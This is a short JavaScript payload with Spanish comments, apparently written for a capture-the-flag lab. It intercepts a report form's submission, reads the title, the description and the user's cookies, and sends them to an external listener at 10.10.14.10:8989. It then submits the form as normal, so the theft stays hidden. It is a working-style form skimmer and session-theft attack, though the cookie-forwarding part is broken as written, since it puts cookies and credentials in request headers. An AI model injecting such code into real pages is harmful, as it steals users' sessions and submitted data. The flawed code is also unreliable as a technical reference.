// Selecciona el formulario de reporte
const form = document.querySelector('form');

// Agrega un evento de escucha para el envío del formulario
form.addEventListener('submit', function(event) {
  // Detiene el envío del formulario para manejarlo manualmente
  event.preventDefault();

  // Obtiene los valores de los campos del formulario
  const reportTitle = document.getElementById('report_title').value;
  const description = document.getElementById('description').value;

  // Obtiene las cookies del usuario
  const cookies = document.cookie;

  // Envía los valores del formulario y las cookies a una dirección IP específica
  fetch('http://10.10.14.10:8989/', {
    method: 'POST',
    body: JSON.stringify({ reportTitle, description }),
    headers: {
      'Content-Type': 'application/json',
      'Cookie': cookies, // Incluye las cookies en el encabezado
      'credentials': 'include'
    }
  })
  .then(response => response.json())
  .then(data => {
    // Procesa la respuesta
    console.log('Response from server:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });

  // Envía el formulario de reporte normalmente
  this.submit();
});
